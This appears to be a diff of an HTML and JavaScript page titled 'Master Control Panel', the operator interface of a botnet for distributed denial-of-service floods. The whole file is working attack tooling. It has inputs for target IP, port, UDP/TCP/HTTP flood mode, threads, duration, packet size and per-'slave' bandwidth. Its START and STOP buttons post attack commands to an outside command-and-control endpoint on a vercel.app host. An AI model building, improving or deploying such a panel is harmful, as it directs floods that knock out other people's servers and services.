@@ -2,33 +2,67 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Master Control</title>
-  <style>body{font-family:Arial;margin:20px;}</style>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f0f;
+      color: #0f0;
+      margin: 20px;
+      text-align: center;
+    }
+    h1 { color: #0f0; }
+    input, select, button {
+      padding: 10px;
+      margin: 8px;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+    button {
+      background: #0f0;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover { background: #00cc00; }
+    .stop { background: #ff4444; color: white; }
+    .info {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
+    }
+  </style>
 </head>
 <body>
-  <h1>Master Control Panel</h1>
-  
-  <p><strong>Controller URL:</strong> <span id="url"></span></p>
+  <h1>🚀 Master Control Panel</h1>
+  <p><strong>Controller:</strong> https://iosdfj.vercel.app</p>
 
-  <input id="ip" placeholder="Target IP" value="1.2.3.4" style="width:200px"><br><br>
-  <input id="port" placeholder="Port" value="53" type="number"><br><br>
+  <br>
+  <input id="ip" placeholder="Target IP" value="127.0.0.1"><br>
+  <input id="port" placeholder="Port" value="53" type="number"><br>
   
   <select id="mode">
     <option value="udp">UDP (L4)</option>
     <option value="tcp">TCP Connect (L4)</option>
     <option value="http">HTTP GET (L7)</option>
-  </select><br><br>
+  </select><br>
 
-  <input id="threads" placeholder="Threads per slave" value="25" type="number"><br><br>
-  <input id="duration" placeholder="Duration (seconds)" value="25" type="number"><br><br>
-  <input id="psize" placeholder="Packet Size" value="1024" type="number"><br><br>
-  <input id="mbps" placeholder="Target Mbps per slave" value="4" type="number"><br><br>
+  <input id="threads" placeholder="Threads" value="25" type="number"><br>
+  <input id="duration" placeholder="Duration (seconds)" value="25" type="number"><br>
+  <input id="psize" placeholder="Packet Size" value="1024" type="number"><br>
+  <input id="mbps" placeholder="Target Mbps per slave" value="4" type="number"><br>
 
-  <button onclick="startAttack()" style="padding:10px 20px;font-size:16px">🚀 START ALL SLAVES</button>
-  <button onclick="stopAttack()" style="padding:10px 20px;font-size:16px">⛔ STOP ALL SLAVES</button>
+  <br>
+  <button onclick="startAttack()">🚀 START ALL SLAVES</button>
+  <button class="stop" onclick="stopAttack()">⛔ STOP ALL SLAVES</button>
 
-<script>
-    const API_URL = "https://iosdfj.vercel.app/app/api/command/route.ts";
+  <div class="info">
+    <p>Status: <span id="status">Ready</span></p>
+  </div>
+
+  <script>
+    const apiUrl = "https://superdupertuff.vercel.app/api/command";
 
     async function startAttack() {
       const data = {
@@ -42,22 +76,26 @@
         target_mbps: parseFloat(document.getElementById('mbps').value)
       };
 
-      await fetch(API_URL, {
+      await fetch(apiUrl, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
-      alert('✅ START sent!');
+
+      document.getElementById('status').innerHTML = '✅ <b>START</b> command sent!';
+      setTimeout(() => document.getElementById('status').innerHTML = 'Ready', 4000);
     }
 
     async function stopAttack() {
-      await fetch(API_URL, {
+      await fetch(apiUrl, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({action: "stop"})
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: "stop" })
       });
-      alert('⛔ STOP sent!');
+
+      document.getElementById('status').innerHTML = '⛔ <b>STOP</b> command sent!';
+      setTimeout(() => document.getElementById('status').innerHTML = 'Ready', 4000);
     }
-</script>
+  </script>
 </body>
 </html>
